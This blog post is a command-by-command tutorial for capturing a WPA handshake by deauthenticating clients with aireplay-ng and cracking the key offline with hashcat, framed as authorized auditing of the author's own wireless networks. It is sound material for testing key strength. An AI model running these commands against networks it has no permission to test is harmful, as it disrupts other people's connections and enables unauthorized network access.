---
title: "Cracking a WPA Handshake with Hashcat"
summary: "The capture-to-crack workflow I use to test WPA pre-shared key strength during authorized wireless audits, from monitor mode to the final hashcat run."
date: 2026-10-19
tags: ["security", "wireless", "hashcat", "homelab"]
draft: false
---

Authorized testing only. This is a PSK audit on a network I have permission to test. Capturing or cracking handshakes on a network you don't own is illegal in most places.

## Workflow

Kill wifi connections → start monitor mode → scan for networks → identify target → grab handshake → verify capture → create capture hash → transfer hash to PC → run hashcat → profit

## Commands

Confirm the right interface:

```bash
iwconfig
```

Kill processes that interfere with the wifi card:

```bash
sudo airmon-ng check kill
```

Start monitor mode:

```bash
sudo airmon-ng start <wifi adapter name>
```

Scan targets across the 2.4 and 5 GHz radios. `-b` = band (`a` = 5 GHz, `bg` = 2.4 GHz), `--essid` = target network name:

```bash
sudo airodump-ng -b <abg> --essid <essid name> <wifi adapter name>
```

Make note of the Channel, BSSID, and ESSID. Example:

```
BSSID = <target mac>
ESSID = <target ssid>
CH    = <channel>
```

Watch for the handshake. `-c` = channel, `-w` = write file:

```bash
sudo airodump-ng -c <channel> -w <file name> --bssid <target mac> wlan0mon
```

In a new terminal, force the handshake by deauthing clients so they reconnect. The first command deauths everyone on the AP; the second targets one client. `-a` = target AP MAC, `-c` = client MAC:

```bash
sudo aireplay-ng --deauth 1 -a <target mac> wlan0mon

sudo aireplay-ng --deauth 3 -a <target mac> -c <client mac> wlan0mon
```

Back in the airodump window, watch the top right for `WPA handshake: <target mac>`. To double-check the capture actually landed, point aircrack-ng at the file and look for a line reporting `1 handshake`:

```bash
aircrack-ng <file name>-01.cap
```

Transform the capture into a hashcat file:

```bash
hcxpcapngtool -o hash.22000 <file name>-01.cap
```

Transfer `hash.22000` to the cracking box, then run hashcat. `-m 22000` is the WPA/WPA2 mode:

```bash
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt
```

Reprint the password after it cracks without rerunning the attack:

```bash
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt --show
```

## Why this matters

A weak PSK is the whole ballgame on WPA2. The handshake is capturable by anyone in range, and from there the only thing standing between an attacker and the network is how guessable the key is. Running this against my own networks turns "we set a password" into measured evidence of whether that password would actually hold up offline. If a key falls to a wordlist in minutes, it gets changed.
